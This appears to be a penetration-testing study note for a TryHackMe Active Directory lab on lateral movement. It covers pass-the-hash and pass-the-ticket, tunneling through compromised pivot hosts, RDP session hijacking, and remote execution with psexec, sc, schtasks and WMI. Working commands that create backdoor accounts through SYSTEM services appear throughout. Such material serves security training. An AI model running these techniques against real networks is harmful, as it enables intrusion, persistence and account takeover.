# Lateral Movement and Pivoting

`ssh za\<AD Username>@thmjmp2.za.tryhackme.com` to SSH into an AD managed machine

* `za` = the **Active Directory domain name**
* `\\` = an **escaped backslash** (required in Bash/Zsh because `\` is normally interpreted as an escape character)
* `<AD Username>` = the **domain account username**

## Abusing Windows Authentication Protocols

### Pass-the-Hash (PtH)

Only works on NTLM enabled services and Domains. Involves extracting NTLM password hashes and replying that hash to the authentication server to get authenticated. Can be extracted with `mimiktaz`

### Pass-the-Ticket (PtT)

Only works on Kerberos enabled services and Domains. Involves extracting Kerberos tickets and sessions keys (view [#kerberos-authentication](../../principles-of-windows.md#kerberos-authentication "mention") to learn more about how Kerberos works) from LSASS memory using `mimikatz`  with `SYSTEM` to authenticate to other services. We want Ticket-Granting-Tickets (TGT) and not Ticket-Granting-Service (TGS) to allow use to access whichever services we wnat.

### Pass-the-Key (PtK)

Similar to PtH but works on Kerberos networks. Involves extracting the encryption key used to encrypt timestamps ([#kerberos-authentication](../../principles-of-windows.md#kerberos-authentication "mention")) and using it to request the KDC for a TGT.

## Port Forwarding

Many of these attacks detailed in this document involve ports being open from our attacking machine (SMB, RDP, WinRM, RPC) but if they are blocked we might need to port forward by using the compromised hosts as a pivot host.

### SSH Tunneling

We want to start a tunnel from our compromised host to our attacking machine because typically compromised hosts will not have SSH servers running on them. To ensure safety we should create an account on our attacking machine with very limited permissions that the compromised host will connect to.

`useradd tunneluser -m -d /home/tunneluser -s /bin/true`

`passwd tunneluser`

#### SSH Remote Port Forwarding

If we cannot access a machine directly from our attacking machine (usually due to firewall rules) we can use the compromised PC to proxy the connection to the target host and port forward that to our attacking PC.

{% hint style="info" %}
RDP is not an option here because of two constraints that are usually present:

1. We may not have GUI access.
2. Our pivot host may not have the required scripting languages to run exploits.
{% endhint %}

`ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N`  to be run on compromised PC

* -R: reverse port forward.
* -N: no remote command; just tunnel. if our pivot hosts tries to open a shell, immediately disconnect
* on our attacker PC we can just RDP into the forwarded port
  * `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`

#### SSH Local Port Forwarding

The idea is to "pull" a port from the SSH server (attacking machine) into the SSH client (pivot host) and make any service available from our attacking machine available on a port on our compromised pivot host.

`ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`

* -L: local port forward
* must specify local socket to receive connections
  * It’s the listening socket on 1.1.1.1:80, created by the SSH server after login. That socket is exposed to the outside world, and all traffic to it gets tunneled back to your localhost’s 127.0.0.1:80
* `netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80`  to create a new firewall rule to open a new port on the compromised host

### Port Forwarding with Socat

This is only possible if you transfer over the compiled executable binary into the pivot host.

`socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321` to open port 1234 on the compromised pivot host and forward any connection we receive there to port 4321 on our target host 1.1.1.1

* `fork` allows socat to fork a new process for each connection received
  * forks → makes a child process to handle that specific connection
  * that child process forwards data to 1.1.1.1:4321
* make sure to create new firewall rule like done above\


<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Dynamic Port Forwarding and SOCKS

> SOCKS proxy: a general-purpose proxy server that relays any kind of traffic (TCP and sometimes UDP) between a client and a destination server, without interpreting the traffic.

We may want to run scans across many across **many machines** which is impossible from single port forwarding. Using the pivot host as a SOCKS proxy will allow us to do that.

`ssh tunneluser@1.1.1.1 -R 9050 -N` to start a SOCKS proxy on port 9050 and forward any request through the SSH tunnel where they are proxied by the SSH client (pivot host)

Any of our typical tools (nmap, etc.) can leverage that SOCKS proxy by using `proxychains`&#x20;

* make sure to configure your `/etc/proxychains.conf` on your system
* e.g. `proxychains curl [<http://pxeboot.za.tryhackme.com`&#x20;

## Abusing User Behavior

### Network Shares

A lot of network shares are writable, so we can plant force users into executing some payloads.

{% hint style="info" %}
If there is a shortcut an executable (so users can execute a script without copying to machine) we can overwrite that script and run whatever we want, when ran the executable gets copied into the `%temp%` directory
{% endhint %}

### Remote Desktop Protocol (RDP) Hijacking

When an administrator uses RDP and closes the client without logging off, the session is still open, an attacker can take over the open session. (Note: **Must have SYSTEM on Windows 2016 or earlier**)

`query user` to find session names and state (`Disc` means left open and not being used. `Active` means someone is currently using it)

`tscon 3 /rdp-tcp#6` to connect using the tscon.exe

* The command states that the graphical session 3 owned by the corresponding user, should be connected with the RDP session rdp-tcp#6, owned by the administrator user

## Spawning Processes Remotely

### psexec

Is a tool used to execute processes remotely allowing an administrator to run commands remotely on any PC where he has access.

`psexec64.exe \MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`&#x20;

### Windows Remote Management (WinRM)

A web-based protocol used to send Powershell commands to Windows hosts remotely. Enabled by default.

`winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`

### Service Control (sc)

A tool used to manage Windows Services. It can be leveraged to run arbitrary commands since services will execute a command when started. Services are run by `SYSTEM` and allow for persistence.

```sh
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

{% hint style="info" %}
Starting reverse shells with services is quite hard because Service Control Manager (SCM) expects any program running as a service to communicate with it in a specific way (e.g., by responding to start/stop signals). A normal executable doesn't do this. When the SCM starts a non-service executable, it doesn't receive the expected "I have started" signal, so it assumes the service has failed and terminates the process almost immediately.
{% endhint %}

### Scheduled Tasks

```shell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### Windows Management Instrumentation (WMI)

A windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. It allows administrators to perform management tasks that attackers can abuse to perform lateral movement.

To connect to WMI via Powershell, we need to create a `PSCredential` Object

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then need to Establish our `$Session` variable

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

Here is how we can leverage it

```powershell
#Remote Process Creation: send a request to the Win32_Process class
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}

#Remote Service Creation
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

##Handling the service
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
##Stopping and deleting the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete

#Remote Scheduled Task
##Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
##Delete the task
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"

#Installing MSI packages
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
